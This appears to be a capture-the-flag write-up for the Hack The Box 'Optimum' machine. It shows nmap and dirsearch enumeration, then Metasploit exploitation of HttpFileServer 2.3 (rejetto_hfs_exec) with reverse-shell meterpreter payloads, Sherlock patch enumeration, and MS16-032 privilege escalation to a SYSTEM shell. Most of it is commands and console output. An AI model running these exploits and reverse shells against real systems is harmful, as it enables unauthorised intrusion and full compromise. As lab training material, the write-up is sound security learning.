@@ -1,0 +1,352 @@
+Enumeration:
+
+Started off with an nmap scan to discvoer all ports as follows : 
+
+>nmap -A -sV -sC 10.10.10.8 -vv -p-
+
+This provided the following results :
+
+PORT   STATE SERVICE REASON  VERSION
+80/tcp open  http    syn-ack HttpFileServer httpd 2.3
+|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: HFS 2.3
+|_http-title: HFS /
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Main thing to focus on here is the version of the webserver "HttpFileServer" - keep that in the back of your mind for later.
+
+There is nothing else of note, but as its a web server lets run a dirsearch to see what we can get : 
+>python3 dirsearch.py -u http://10.10.10.8  
+This only gave us 2 hits :
+Target: http://10.10.10.8/
+
+Output File: /home/kali/tools/dirsearch/reports/10.10.10.8/_21-08-05_05-57-16.txt
+
+[05:57:16] Starting: 
+[05:58:08] 200 -  576B  - /favicon.ico                                                                                                  
+[05:58:29] 200 -    4KB - /servlet/%C0%AE%C0%AE%C0%AF  
+
+After throwing a few wordlits in gobuster, it doesn't look like theres anything else of note so lets have a look at the site itself. Its a pretty basic page, with a login box,
+a folder for files and some other functionality, but we also find confirmation of the server version : 
+
+HttpFileServer 2.3
+Server time: 11/8/2021 9:58:34 μμ
+Server uptime: 11:54:02 
+
+After trying some basic username/password combinations (admin:admin, admin:password etc) I turn towards metasploit to see if we can find something there.
+>msfconsole
+>msf6 > search httpfileserver
+
+Matching Modules
+================
+
+   #  Name                                   Disclosure Date  Rank       Check  Description
+   -  ----                                   ---------------  ----       -----  -----------
+   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
+------------------------------------------------------------------------------------------------------------------------------------------------------
+Exploiting:
+
+Looks promising so lets see what we need to set :
+msf6 > use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/http/rejetto_hfs_exec) > show options
+
+Module options (exploit/windows/http/rejetto_hfs_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               no        Seconds to wait before terminating web server
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT      80               yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       The path of the web application
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+After setting the RHOST and LHOST then executing the exploit we successfully get access to the server : 
+
+msf6 exploit(windows/http/rejetto_hfs_exec) > set rhost 10.10.10.8
+rhost => 10.10.10.8
+msf6 exploit(windows/http/rejetto_hfs_exec) > set lhost 10.10.14.66 
+lhost => 10.10.14.66
+msf6 exploit(windows/http/rejetto_hfs_exec) > run
+
+[*] Started reverse TCP handler on 10.10.14.66:4444 
+[*] Using URL: http://0.0.0.0:8080/gpEZrke9Joz
+[*] Local IP: http://10.0.2.15:8080/gpEZrke9Joz
+[*] Server started.
+[*] Sending a malicious request to /
+[*] Payload request received: /gpEZrke9Joz
+[*] Sending stage (175174 bytes) to 10.10.10.8
+[*] Sending stage (175174 bytes) to 10.10.10.8
+[*] Sending stage (175174 bytes) to 10.10.10.8
+[!] Tried to delete %TEMP%\UAdKS.vbs, unknown result
+[*] Meterpreter session 2 opened (10.10.14.66:4444 -> 10.10.10.8:49201) at 2021-08-05 06:06:19 -0400
+[*] Meterpreter session 3 opened (10.10.14.66:4444 -> 10.10.10.8:49200) at 2021-08-05 06:06:19 -0400
+[*] Meterpreter session 1 opened (10.10.14.66:4444 -> 10.10.10.8:49206) at 2021-08-05 06:06:19 -0400
+[*] Server stopped.
+
+meterpreter > 
+
+If we start to poke around and run "ls" we get the user flag : 
+
+meterpreter > ls
+Listing: C:\Users\kostas\Desktop
+================================
+
+Mode              Size    Type  Last modified              Name
+----              ----    ----  -------------              ----
+40777/rwxrwxrwx   0       dir   2021-08-11 03:11:57 -0400  %TEMP%
+100666/rw-rw-rw-  56      fil   2021-08-11 03:43:44 -0400  bashshell
+100666/rw-rw-rw-  56      fil   2021-08-11 03:46:44 -0400  bashshell.ps1
+100666/rw-rw-rw-  282     fil   2017-03-18 07:57:16 -0400  desktop.ini
+100777/rwxrwxrwx  760320  fil   2014-02-16 06:58:52 -0500  hfs.exe
+100444/r--r--r--  32      fil   2017-03-18 08:13:18 -0400  user.txt.txt
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+So now we just need to get root.
+If we CD out of the user (kostas) we can see there are a few other users, but the one we want to focus on is Administrator :
+
+meterpreter > ls
+Listing: C:\Users
+=================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+40777/rwxrwxrwx   8192  dir   2017-03-18 07:52:50 -0400  Administrator
+40777/rwxrwxrwx   0     dir   2013-08-22 10:48:41 -0400  All Users
+40555/r-xr-xr-x   8192  dir   2013-08-22 09:36:16 -0400  Default
+40777/rwxrwxrwx   0     dir   2013-08-22 10:48:41 -0400  Default User
+40555/r-xr-xr-x   4096  dir   2013-08-22 09:36:16 -0400  Public
+100666/rw-rw-rw-  174   fil   2013-08-22 11:39:32 -0400  desktop.ini
+40777/rwxrwxrwx   8192  dir   2017-03-18 07:57:09 -0400  kostas
+
+I wont bore you with the sheer amount of googling i did to figure out where to go from here as this would probably end up in the 1000'l of lines.
+But once I did its a ......relitively simple process. 
+
+Firstly, we need to get a a cool PowerShell script which will find missing software patches for local privilege escalation vulnerabilities and upload to our session.
+- this can be found don this github repo https://github.com/rasta-mouse/Sherlock.
+
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_import /home/kali/learning_sites/HackTheBox/Optimum/Sherlock/Sherlock.ps1
+[+] File successfully imported. No result was returned.
+
+eterpreter > powershell_execute Find-AllVulns
+[+] Command execution completed:
+
+
+Title      : User Mode to Ring (KiTrap0D)
+MSBulletin : MS10-015
+CVEID      : 2010-0232
+Link       : https://www.exploit-db.com/exploits/11199/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : Task Scheduler .XML
+MSBulletin : MS10-092
+CVEID      : 2010-3338, 2010-3888
+Link       : https://www.exploit-db.com/exploits/19930/
+VulnStatus : Not Vulnerable
+
+Title      : NTUserMessageCall Win32k Kernel Pool Overflow
+MSBulletin : MS13-053
+CVEID      : 2013-1300
+Link       : https://www.exploit-db.com/exploits/33213/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : TrackPopupMenuEx Win32k NULL Page
+MSBulletin : MS13-081
+CVEID      : 2013-3881
+Link       : https://www.exploit-db.com/exploits/31576/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : TrackPopupMenu Win32k Null Pointer Dereference
+MSBulletin : MS14-058
+CVEID      : 2014-4113
+Link       : https://www.exploit-db.com/exploits/35101/
+VulnStatus : Not Vulnerable
+
+Title      : ClientCopyImage Win32k
+MSBulletin : MS15-051
+CVEID      : 2015-1701, 2015-2433
+Link       : https://www.exploit-db.com/exploits/37367/
+VulnStatus : Not Vulnerable
+
+Title      : Font Driver Buffer Overflow
+MSBulletin : MS15-078
+CVEID      : 2015-2426, 2015-2433
+Link       : https://www.exploit-db.com/exploits/38222/
+VulnStatus : Not Vulnerable
+
+Title      : 'mrxdav.sys' WebDAV
+MSBulletin : MS16-016
+CVEID      : 2016-0051
+Link       : https://www.exploit-db.com/exploits/40085/
+VulnStatus : Not supported on 64-bit systems
+
+Title      : Secondary Logon Handle
+MSBulletin : MS16-032
+CVEID      : 2016-0099
+Link       : https://www.exploit-db.com/exploits/39719/
+VulnStatus : Appears Vulnerable
+
+Title      : Windows Kernel-Mode Drivers EoP
+MSBulletin : MS16-034
+CVEID      : 2016-0093/94/95/96
+Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
+VulnStatus : Appears Vulnerable
+
+Title      : Win32k Elevation of Privilege
+MSBulletin : MS16-135
+CVEID      : 2016-7255
+Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
+VulnStatus : Appears Vulnerable
+
+Title      : Nessus Agent 6.6.2 - 6.10.3
+MSBulletin : N/A
+CVEID      : 2017-7199
+Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
+VulnStatus : Not Vulnerable
+
+Now, there are A LOT of vulns to work through, but the one we are focusing on is MS16-032 - Secondary Logon Handle.
+
+Background this session (meterpreter > baackground) and search for MS16-02 and set up the required options :
+
+msf6 post(multi/recon/local_exploit_suggester) > search ms16-032
+
+Matching Modules
+================
+
+   #  Name                                                           Disclosure Date  Rank    Check  Description
+   -  ----                                                           ---------------  ----    -----  -----------
+   0  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  2016-03-21       normal  Yes    MS16-032 Secondary Logon Handle Privilege Escalation
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
+
+msf6 post(multi/recon/local_exploit_suggester) > use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > show options
+
+Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information               Connection
+  --  ----  ----                     -----------               ----------
+  1         meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.14.66:4444 -> 10.10.10.8:49162 (10.10.10.8)
+
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
+session => 1
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost 10.10.14.66
+
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
+
+[*] Started reverse TCP handler on 10.10.14.66:4444 
+[+] Compressed size: 1016
+[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\GeIztCzpR.ps1...
+[*] Compressing script contents...
+[+] Compressed size: 3584
+[*] Executing exploit script...
+         __ __ ___ ___   ___     ___ ___ ___ 
+        |  V  |  _|_  | |  _|___|   |_  |_  |
+        |     |_  |_| |_| . |___| | |_  |  _|
+        |_|_|_|___|_____|___|   |___|___|___|
+                                            
+                       [by b33f -> @FuzzySec]
+
+[?] Operating system core count: 2
+[>] Duplicating CreateProcessWithLogonW handle
+[?] Done, using thread handle: 1996
+
+[*] Sniffing out privileged impersonation token..
+
+[?] Thread belongs to: svchost
+[+] Thread suspended
+[>] Wiping current impersonation token
+[>] Building SYSTEM impersonation token
+[?] Success, open SYSTEM token handle: 1956
+[+] Resuming thread..
+
+[*] Sniffing out SYSTEM shell..
+
+[>] Duplicating SYSTEM token
+[>] Starting token race
+[>] Starting process race
+[!] Holy handle leak Batman, we have a SYSTEM shell!!
+
+yAWiefSETZqM7cCNenLBtnoB2B9YzK05
+[+] Executed on target machine.
+[*] Sending stage (200262 bytes) to 10.10.10.8
+[*] Meterpreter session 2 opened (10.10.14.66:4444 -> 10.10.10.8:49163) at 2021-08-05 07:06:29 -0400
+[+] Deleted C:\Users\kostas\AppData\Local\Temp\GeIztCzpR.ps1
+
+
+
+running getuid will confirm the following : 
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+So now you just need to navigate to the Administraotr user and grab the root flag.
+
+
+
+
+
+
+
+
+
+
+
+
+
